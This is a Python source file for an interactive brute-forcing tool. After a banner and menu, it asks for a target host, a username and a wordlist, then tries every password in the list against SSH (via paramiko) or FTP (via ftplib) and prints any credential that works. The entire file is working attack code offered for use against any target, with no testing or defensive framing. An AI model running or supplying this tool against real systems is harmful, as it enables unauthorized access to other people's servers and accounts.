import paramiko
import os
import ftplib
from colorama import *

class Variables:

    global __creators__, __version__, __github__

    __creators__ = 'LotusCorp'
    __version__  = '1.0.1'
    __github__   = 'github.com/LotusCorp'

class Modules:

    def __clear__():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    
    def __detect__():
        if os.name == 'nt':
            return 'Windows'
        else:
            return 'Linux'

    def __banner__():

        __system__ = Modules.__detect__()

        print(f'''
                .?B5^ 
               !B@@@&J.  
             :5@@@@@@@B~ 
            ^B@@@@@@@@@&7  
  7J7~:    .5@@@@@@@@@@@B^    .^7??.
  P@@@&GY!.  ^JB@@@@@#5~  .~JG#@@@#:
  Y@@@@@@@#5~   !G@#?:  ^JB@@@@@@@B.
  !@@@@@@@@@@G7.  ~:  ~P&@@@@@@@@@Y                 Developers..: {__creators__}
  .G@@@@@@@@@@@B!   ~P@@@@@@@@@@@&^                 Version.....: {__version__}
   !&@@@@@@@@@@@@P~Y&@@@@@@@@@@@@J                  Github......: {__github__}
    7&@@@@@@@@@@@@@@@@@@@@@@@@@@J                   System......: {__system__}
     ~B@@@@@@@@@@@@@@@@@@@@@@@#7 
      .?B@@@@@@@@@@@@@@@@@@@#J: 
        .~JG#@@@@@@@@@@@&BY!. 
        ''')
        print(f'{Fore.WHITE}> Choice your services to bruteforce: {Fore.RESET}') 
        print(f'{Fore.LIGHTMAGENTA_EX}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} SSH Bruteforcer         {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} FTP Bruteforcer     {Fore.BLACK}')
        print(f'{Fore.LIGHTMAGENTA_EX}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
def ssh_bruteforce(hostname, username, password_file):
    with open(password_file) as f:
        for password in f:
            password = password.strip()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname, username=username, password=password, timeout=5)
                print(f"[*] Found password: {password}")
                ssh.close()
                return
            except:
                pass
        print("[*] Password not found")

def ftp_bruteforce(hostname, username, password_file):
    with open(password_file) as f:
        for password in f:
            password = password.strip()
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                print(f"[*] Found password: {password}")
                ftp.quit()
                return
            except:
                pass
        print("[*] Password not found")


if __name__ == "__main__":
    Modules.__clear__()
    Modules.__banner__()
    choice = input("[>>>]")
    if choice == "1":
        hostname = input('Enter the hostname or IP address: ')
        username = input('Enter the SSH username: ')
        password_file = input('Enter the wordlist file path: ')
        ssh_bruteforce(hostname, username, password_file)
    if choice == "2":
        hostname = input('Enter the hostname or IP address: ')
        username = input('Enter the FTP username: ')
        password_file = input('Enter the wordlist file path: ')
        ftp_bruteforce(hostname, username, password_file)